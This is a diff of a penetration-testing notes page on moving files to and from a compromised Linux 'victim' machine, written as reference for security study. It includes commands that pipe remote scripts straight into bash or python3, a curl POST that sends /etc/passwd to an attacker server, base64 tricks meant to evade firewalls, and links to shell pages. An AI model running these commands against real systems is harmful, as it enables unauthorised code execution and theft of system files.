@@ -9,24 +9,47 @@ tags:
   - file transfer technique
   - backdoors
 ---
-
 # Transferring files techniques  - Linux
 
-## Replicating client-server 
+## Download to Linux
 
-### 1. Setting up a server in the attacking machine 
+### Base64
+
+To avoid firewall protections we can:
+
+**1.** Base64 encode the file:
+
+```shell-session
+base64 file.php -w 0
+
+# Alternative
+cat file |base64 -w 0;echo
+
+```
+
+**2.** Copy the base64 string, go to the remote host and decode it and pipe to a file:
+
+```shell-session
+echo -n "Looooooong-string-encoded-in-base64" | base64 -d > file.php
+# -n: do not output the trailing newline
+```
+
+### Replicating client-server 
+
+#### 1. Setting up a server in the attacking machine 
 
 [See different techniques](servers.md)
 
-### 2. Download files from victim's machine
+#### 2. Download files from victim's machine
 
-#### wget
+##### wget
 
 ```shell-session
-wget http://<SERVERIP>:<SERVERPORT>/<file>
+wget http://<SERVERIP>:<SERVERPORT>/<file> -O  <OutputNameForFile>
+# -O:  set the output filename.
 ```
 
-#### curl
+##### curl
 
 ```shell-session
 curl http://http://<SERVERIP>:<SERVERPORT>/<file> -o <OutputNameForFile>
@@ -37,22 +60,22 @@ curl http://http://<SERVERIP>:<SERVERPORT>/<file> -o <OutputNameForFile>
 
 Because of the way Linux works and how pipes operate, most of the tools we use in Linux can be used to replicate fileless operations, which means that we don't have to download a file to execute it.
 
-#### Fileless Download with cURL
+##### Fileless Download with cURL
 
 ```shell-session
 curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
 ```
 
 
-#### Fileless Download with wget
+##### Fileless Download with wget
 
 ```shell-session
 wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
 ```
 
-## Bash downloads
+### Bash downloads
 
-On the server side (attacking machine), setup a server by using one of the methodologies applied above.
+As long as Bash version 2.04 or greater is installed (compiled with --enable-net-redirections), the built-in /dev/TCP device file can be used for simple file downloads. On the server side (attacking machine), setup a server by using one of the methodologies applied above.
 
 On the client side (victim's machine):
 
@@ -68,7 +91,7 @@ cat <&3
 ```
 
 
-## SSH downloads and uploads: SCP
+### SSH downloads: SCP
 
 SSH implementation comes with an SCP utility for remote file transfer that, by default, uses the SSH protocol. 
 
@@ -95,35 +118,18 @@ From the attacker machine too:
 ```
 # Download file foobar.txt saved in the victim's machin. Command is run from attacker machine connecting to the remote host (victim's machine)
 scp username@$IPvictim:foobar.txt /some/local/directory
+```
 
+
+
+```
 # Upload file foo.txt saved in attacker machine into the victim's. Command is run from attacker machine connecting to the remote host (victim's machine)
 scp foo.txt username@$IPvictim:/some/remote/directory
 ```
 
+## Upload to Linux
 
-
-## Base64
-
-To avoid firewall protections we can:
-
-**1.** Base64 encode the file:
-
-```shell-session
-base64 file.php -w 0
-
-# Alternative
-cat file |base64 -w 0;echo
-
-```
-
-**2.** Copy the base64 string, go to the remote host and decode it and pipe to a file:
-
-```shell-session
-echo -n "Looooooong-string-encoded-in-base64" | base64 -d > file.php
-# -n: do not output the trailing newline
-```
-
-## Web upload
+### Web upload
 
 We can use [uploadserver](uploadserver.md).
 
@@ -132,8 +138,13 @@ We can use [uploadserver](uploadserver.md).
 # Install
 python3 -m pip install --user uploadserver
 
-# As we will use https, we will create a self-signed certificate. This file should be hosted in a different location from the web server folder
+
+# As we will use https, we will create a self-signed certificate.
 openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
+
+#  The webserver should not host the certificate. We recommend creating a new directory to host the file for our webserver.
+mkdir https && cd https
+
 
 # Start the web server
 python3 -m uploadserver 443 --server-certificate /location/different/folder/server.pem
@@ -144,11 +155,37 @@ curl -X POST https://$attackerIP/upload -F 'files=@/etc/passwd' -F 'files=@/etc/
 ```
 
 
-## Backdoors
+### SSH uploads: SCP
 
-See [reverse shells](reverse-shells.md), [bind shells](bind-shells.md), and [web shells](web-shells.md).
+SSH implementation comes with an SCP utility for remote file transfer that, by default, uses the SSH protocol. 
 
-## Transfer Files with Rsync over SSH
+Two requirements:
+
+ - we have ssh user credentials on the remote host
+ - ssh is open on port 22
+
+On the server's side (attacker's machine):
+
+```shell-session
+# Enable the service
+sudo systemctl enable ssh
+
+# Start the server
+sudo systemctl start ssh
+
+# Check if port is listening
+netstat -lnpt
+```
+
+From the attacker machine too:
+
+```
+# Upload file foo.txt saved in attacker machine into the victim's. Command is run from attacker machine connecting to the remote host (victim's machine)
+scp foo.txt username@$IPvictim:/some/remote/directory
+```
+
+
+### Rsync over SSH
 
 [More about RSYNC protocol](873-rsync.md).
 
@@ -162,3 +199,9 @@ rsync OPTION SourceDirectory_or_filePath user@serverIP_or_name:Target
 # Example
 rsync ~/Desktop/Dir1/"source pdf sample.pdf" test@192.168.56.100:~/Desktop/test
 ```
+
+
+### Backdoors
+
+See [reverse shells](reverse-shells.md), [bind shells](bind-shells.md), and [web shells](web-shells.md).
+
